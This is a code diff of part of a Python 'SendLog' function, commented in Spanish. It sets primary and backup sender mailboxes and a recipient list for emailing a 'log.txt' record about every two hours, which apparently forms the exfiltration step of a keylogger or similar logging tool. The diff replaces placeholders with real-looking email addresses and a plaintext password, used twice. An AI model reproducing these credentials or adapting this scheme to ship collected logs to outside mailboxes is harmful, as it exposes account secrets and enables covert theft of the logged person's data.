@@ -291,15 +291,15 @@ def SendLog():
         n = n+1
 
         # Correo de envío [Principal]      <=> Se enviará 
-        sender_email_P       = "Send123@gmail.com"   # <<== Cambia éste correo
-        sender_password_P    = "contraseña1"          # <<== Contraseña del correo 
+        sender_email_P       = "eneboltest@zohomail.com"   # <<== Cambia éste correo
+        sender_password_P    = "Y6dvxnd@"          # <<== Contraseña del correo 
 
         # Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
-        sender_email_S       = "Sendabc@gmail.com"   # <<== Cambia éste correo
-        sender_password_S    = "contraseña2"          # <<== Contraseña del correo 
+        sender_email_S       = "eneboltest2022@gmail.com"   # <<== Cambia éste correo
+        sender_password_S    = "Y6dvxnd@"          # <<== Contraseña del correo 
 
         # Correo o correos que recibirán el registro de datos `log.txt`
-        receiver_email   = ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"] # MultiCorreo
+        receiver_email   = ["eneboltest@zohomail.com","mytestemail212121@gmail.com"] # MultiCorreo
       # receiver_email   = ["correo@gmail.com"]  # SingleCorreo
 
         # Enviar cada 2 horas aprox
